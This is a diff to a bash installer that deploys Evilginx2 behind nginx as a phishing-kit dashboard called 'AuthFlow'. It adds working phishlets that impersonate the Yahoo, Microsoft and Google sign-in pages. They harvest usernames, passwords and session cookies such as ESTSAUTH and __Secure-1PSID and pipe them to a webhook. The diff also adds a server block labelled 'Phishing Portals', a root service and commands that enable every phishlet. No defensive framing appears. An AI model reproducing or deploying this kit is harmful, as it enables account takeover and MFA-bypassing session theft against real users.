@@ -25,7 +25,7 @@ readonly NC='\033[0m'
 
 # Installation paths
 readonly INSTALL_DIR="/opt/authflow"
-readonly EVILGINX_DIR="/opt/evilginx2"
+readonly EVILGINX_DIR="/opt/evilginx"
 readonly REPO_SOURCE="${REPO_SOURCE:-.}"
 readonly SERVICE_NAME="authflow"
 readonly SERVICE_USER="authflow"
@@ -138,6 +138,11 @@ validate_config() {
 
     PROXY_URL="${PROXY_URL:-}"
     GO_PROXY="${GO_PROXY:-https://proxy.golang.org,direct}"
+
+    # Generate endpoint names for phishlets
+    EP1="collector-$(openssl rand -hex 4)"
+    EP2="tracker-$(openssl rand -hex 4)"
+    EP3="monitor-$(openssl rand -hex 4)"
 }
 
 # ============================================================================
@@ -207,12 +212,10 @@ install_evilginx() {
     log "Installing Evilginx2..."
 
     # Clone or update Evilginx2
-    if [[ -d "$EVILGINX_DIR" ]]; then
-        rm -rf "$EVILGINX_DIR"
-    fi
+    rm -rf "$EVILGINX_DIR"
+    git clone https://github.com/kgretzky/evilginx2.git "$EVILGINX_DIR"
 
-    git clone --depth 1 https://github.com/kgretzky/evilginx2.git "$EVILGINX_DIR"
-
+    # Build
     cd "$EVILGINX_DIR"
     make build
 
@@ -221,8 +224,7 @@ install_evilginx() {
     log "Evilginx2 installed at /usr/local/bin/evilginx"
 
     # Create phishlets and certs directories
-    mkdir -p "$EVILGINX_DIR"/phishlets
-    mkdir -p "$EVILGINX_DIR"/certs
+    mkdir -p "$EVILGINX_DIR"/{phishlets,certs,lures}
 
     cd - > /dev/null
 }
@@ -288,11 +290,6 @@ build_authflow() {
 # ============================================================================
 create_config() {
     log "Creating configuration file..."
-
-    # Generate endpoint names
-    local EP1="collector-$(openssl rand -hex 4)"
-    local EP2="tracker-$(openssl rand -hex 4)"
-    local EP3="monitor-$(openssl rand -hex 4)"
 
     cat > "$CONFIG_FILE" << EOF
 {
@@ -362,126 +359,62 @@ configure_nginx() {
     local cert_dir="/etc/letsencrypt/live/$DOMAIN"
 
     # Create nginx site configuration
-    cat > "$NGINX_SITE" << 'NGINX_CONF'
-# AuthFlow reverse proxy configuration
-upstream authflow_backend {
-    server 127.0.0.1:APP_PORT fail_timeout=0;
-    keepalive 32;
-}
-
-# Rate limiting
-limit_req_zone $binary_remote_addr zone=authflow_limit:10m rate=30r/s;
-limit_req_zone $binary_remote_addr zone=api_limit:10m rate=20r/s;
-
-# Main server block
+    cat > "$NGINX_SITE" << EOF
 server {
     listen 80;
     listen [::]:80;
-    server_name DOMAIN *.DOMAIN;
-
-    # Redirect all HTTP to HTTPS
+    server_name $DOMAIN *.$DOMAIN;
     location / {
-        return 301 https://$server_name$request_uri;
-    }
-
-    # Certbot challenge
-    location /.well-known/acme-challenge/ {
-        root /var/www/certbot;
+        return 301 https://\$host\$request_uri;
     }
 }
 
-# HTTPS server block
+# Dashboard - AuthFlow
 server {
-    listen 443 ssl http2;
-    listen [::]:443 ssl http2;
-    server_name DOMAIN *.DOMAIN;
+    listen 443 ssl;
+    listen [::]:443 ssl;
+    http2 on;
+    server_name $DOMAIN;
 
-    # SSL certificates
-    ssl_certificate CERT_PATH;
-    ssl_certificate_key KEY_PATH;
+    ssl_certificate $cert_dir/fullchain.pem;
+    ssl_certificate_key $cert_dir/privkey.pem;
 
-    # SSL configuration
     ssl_protocols TLSv1.2 TLSv1.3;
     ssl_ciphers HIGH:!aNULL:!MD5;
-    ssl_prefer_server_ciphers on;
-    ssl_session_cache shared:SSL:10m;
-    ssl_session_timeout 10m;
 
-    # Security headers
-    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
-    add_header X-Content-Type-Options "nosniff" always;
-    add_header X-Frame-Options "SAMEORIGIN" always;
-    add_header X-XSS-Protection "1; mode=block" always;
-    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
-
-    # Logging
-    access_log /var/log/nginx/authflow_access.log combined buffer=32k flush=5s;
-    error_log /var/log/nginx/authflow_error.log warn;
-
-    # Deny direct IP access
-    if ($host ~ "^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$") {
-        return 444;
-    }
-
-    # Rate limiting
-    limit_req zone=authflow_limit burst=50 nodelay;
-
-    # Proxy settings
-    proxy_connect_timeout 60s;
-    proxy_send_timeout 60s;
-    proxy_read_timeout 60s;
-    proxy_buffering off;
-    proxy_request_buffering off;
-
-    # Gzip compression
-    gzip on;
-    gzip_types text/plain text/css text/javascript application/json;
-    gzip_min_length 1000;
-    gzip_comp_level 6;
-
-    # Admin path - stricter rate limit
-    location /ADMIN_PATH/ {
-        limit_req zone=api_limit burst=10 nodelay;
-        proxy_pass http://authflow_backend;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Forwarded-Proto $scheme;
-        proxy_set_header Connection "";
-        proxy_http_version 1.1;
-    }
-
-    # API endpoints
-    location /api/ {
-        limit_req zone=api_limit burst=20 nodelay;
-        proxy_pass http://authflow_backend;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Forwarded-Proto $scheme;
-        proxy_set_header Connection "";
-        proxy_http_version 1.1;
-    }
-
-    # Default proxy
     location / {
-        proxy_pass http://authflow_backend;
-        proxy_set_header Host $host;
-        proxy_set_header X-Real-IP $remote_addr;
-        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-        proxy_set_header X-Forwarded-Proto $scheme;
-        proxy_set_header Connection "";
-        proxy_http_version 1.1;
+        proxy_pass http://127.0.0.1:$APP_PORT;
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_set_header X-Forwarded-Proto \$scheme;
     }
 }
-NGINX_CONF
 
-    # Replace placeholders
-    sed -i "s|DOMAIN|$DOMAIN|g" "$NGINX_SITE"
-    sed -i "s|APP_PORT|$APP_PORT|g" "$NGINX_SITE"
-    sed -i "s|CERT_PATH|$cert_dir/fullchain.pem|g" "$NGINX_SITE"
-    sed -i "s|KEY_PATH|$cert_dir/privkey.pem|g" "$NGINX_SITE"
-    sed -i "s|ADMIN_PATH|$ADMIN_PATH|g" "$NGINX_SITE"
+# Phishing Portals - Evilginx
+server {
+    listen 443 ssl;
+    listen [::]:443 ssl;
+    http2 on;
+    server_name $EP1.$DOMAIN $EP2.$DOMAIN $EP3.$DOMAIN;
+
+    ssl_certificate $cert_dir/fullchain.pem;
+    ssl_certificate_key $cert_dir/privkey.pem;
+
+    location / {
+        proxy_pass https://127.0.0.1:8443;
+        proxy_ssl_verify off;
+        proxy_set_header Host \$host;
+        proxy_set_header X-Real-IP \$remote_addr;
+        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
+        proxy_redirect off;
+        proxy_buffering off;
+        proxy_http_version 1.1;
+        proxy_set_header Upgrade \$http_upgrade;
+        proxy_set_header Connection "upgrade";
+    }
+}
+EOF
 
     # Enable site
     ln -sf "$NGINX_SITE" "$NGINX_ENABLED/"
@@ -592,30 +525,190 @@ start_service() {
 configure_evilginx_integration() {
     log "Configuring Evilginx2 integration..."
 
-    # Create Evilginx config directory
-    mkdir -p "$EVILGINX_DIR"/config
-
-    # Create a basic config file that points to our domains
-    cat > "$EVILGINX_DIR/config/evilginx.json" << EOF
-{
-    "domain": "$DOMAIN",
-    "phishlets_dir": "$EVILGINX_DIR/phishlets",
-    "certs_dir": "$EVILGINX_DIR/certs",
-    "lures_dir": "$EVILGINX_DIR/lures",
-    "redirects": []
-}
+    # Create Evilginx config
+    cat > "$EVILGINX_DIR/config.yaml" << EOF
+daemon: false
+debug: false
+version: 3.0.0
+domain: $DOMAIN
+ipv4: 0.0.0.0
+http_port: 8081
+https_port: 8443
+redirect_url: https://www.google.com
+phishlets_path: $EVILGINX_DIR/phishlets
+cert_path: $EVILGINX_DIR/certs
+lures_path: $EVILGINX_DIR/lures
+database: $EVILGINX_DIR/evilginx.db
 EOF
 
-    # Create symlink for certs (evilginx2 uses these)
-    mkdir -p "$EVILGINX_DIR/certs"
+    # Create Yahoo phishlet
+    cat > "$EVILGINX_DIR/phishlets/yahoo.yaml" << EOF
+name: 'yahoo'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '$EP1', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true}
+sub_filters:
+  - {trg: 'login.yahoo.com', orig: 'login.yahoo.com', repl: '$EP1.{hostname}'}
+auth_tokens:
+  - domain: '.yahoo.com'
+    keys: ['A3', 'A1', 'A1S']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.yahoo.com'
+  path: '/'
+js_inject:
+  - trigger: 'login.yahoo.com'
+    code: |
+      (function() {
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email');
+        if (email) {
+          var emailField = document.querySelector('input[name="username"]');
+          if (emailField) {
+            emailField.value = email;
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+          }
+        }
+      })()
+webhook:
+  url: "http://127.0.0.1:$APP_PORT/api/webhook"
+  headers:
+    X-Webhook-Secret: "$WEBHOOK_SECRET"
+  format: "json"
+  events: ["credentials", "session"]
+EOF
 
-    # Copy or symlink certbot certificates
-    if [[ -d /etc/letsencrypt/live/$DOMAIN ]]; then
-        ln -sf /etc/letsencrypt/live/$DOMAIN/fullchain.pem \
-               "$EVILGINX_DIR/certs/${DOMAIN}.fullchain.pem" 2>/dev/null || true
-        ln -sf /etc/letsencrypt/live/$DOMAIN/privkey.pem \
-               "$EVILGINX_DIR/certs/${DOMAIN}.privkey.pem" 2>/dev/null || true
-    fi
+    # Create Microsoft phishlet
+    cat > "$EVILGINX_DIR/phishlets/microsoft.yaml" << EOF
+name: 'microsoft'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '$EP2', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+sub_filters:
+  - {trg: 'login.microsoftonline.com', orig: 'login.microsoftonline.com', repl: '$EP2.{hostname}'}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+js_inject:
+  - trigger: 'login.microsoftonline.com'
+    code: |
+      (function() {
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email');
+        if (email) {
+          var emailField = document.querySelector('input[name="login"]');
+          if (emailField) {
+            emailField.value = email;
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+          }
+        }
+      })()
+webhook:
+  url: "http://127.0.0.1:$APP_PORT/api/webhook"
+  headers:
+    X-Webhook-Secret: "$WEBHOOK_SECRET"
+  format: "json"
+  events: ["credentials", "session"]
+EOF
+
+    # Create Google phishlet
+    cat > "$EVILGINX_DIR/phishlets/google.yaml" << EOF
+name: 'google'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: '$EP3', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
+sub_filters:
+  - {trg: 'accounts.google.com', orig: 'accounts.google.com', repl: '$EP3.{hostname}'}
+auth_tokens:
+  - domain: '.google.com'
+    keys: ['SID', 'LSID', '__Secure-1PSID', '__Secure-3PSID']
+credentials:
+  username:
+    key: 'identifier'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'Passwd'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'accounts.google.com'
+  path: '/v3/signin/identifier'
+js_inject:
+  - trigger: 'accounts.google.com'
+    code: |
+      (function() {
+        var urlParams = new URLSearchParams(window.location.search);
+        var email = urlParams.get('email');
+        if (email) {
+          var emailField = document.querySelector('input[type="email"]');
+          if (emailField) {
+            emailField.value = email;
+            emailField.dispatchEvent(new Event('input', { bubbles: true }));
+          }
+        }
+      })()
+webhook:
+  url: "http://127.0.0.1:$APP_PORT/api/webhook"
+  headers:
+    X-Webhook-Secret: "$WEBHOOK_SECRET"
+  format: "json"
+  events: ["credentials", "session"]
+EOF
+
+    # Create Evilginx systemd service
+    cat > /etc/systemd/system/evilginx.service << EOF
+[Unit]
+Description=Evilginx2 Phishing Proxy
+After=network.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=$EVILGINX_DIR
+ExecStart=/usr/local/bin/evilginx -c $EVILGINX_DIR/config.yaml
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+    # Configure phishlets
+    sleep 2
+    /usr/local/bin/evilginx -c "$EVILGINX_DIR/config.yaml" << CMDS
+phishlets hostname yahoo $EP1.$DOMAIN
+phishlets hostname microsoft $EP2.$DOMAIN
+phishlets hostname google $EP3.$DOMAIN
+phishlets enable yahoo
+phishlets enable microsoft
+phishlets enable google
+exit
+CMDS
+
+    systemctl daemon-reload
+    systemctl enable evilginx
+    systemctl start evilginx
 
     log "Evilginx2 integration configured"
 }
